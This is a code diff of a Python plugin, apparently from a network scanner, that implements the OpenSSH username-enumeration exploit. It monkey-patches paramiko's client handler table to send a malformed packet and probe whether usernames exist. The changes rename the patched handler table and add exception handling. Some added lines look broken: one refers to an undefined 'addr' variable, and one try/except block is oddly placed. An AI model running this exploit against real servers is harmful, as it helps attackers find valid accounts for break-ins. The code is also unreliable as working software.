@@ -19,7 +19,7 @@ import logging as log
 from .IPlugin import IPlugin, connection_type
 
 log.getLogger("paramiko").setLevel(log.CRITICAL)
-old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
+old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
 
 class BadUsername(Exception):
 	def __init__(self):
@@ -51,18 +51,18 @@ def checkUsername(ip, username, tried=0):
 	    	return checkUsername(ip, username, tried)
 	    else:
 	    	log.info("plugin=openssh-15473 error=failed_to_connect")
+	except Exception as e: log.error('OOPS {}:{} -> {}'.format(addr[0],addr[1], e))
 	try:
 		transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
 	except BadUsername:
     		return (username, False)
 	except paramiko.ssh_exception.AuthenticationException:
     		return (username, True)
-	log.debug("plugin=openssh-15473 error=???")
+	except Exception as e: log.info("plugin=openssh-15473 error=???")
 	return
 
-paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
-paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
-
+paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
+paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error
 class Plugin(IPlugin):
 	def __init__(self):
 		super().__init__()
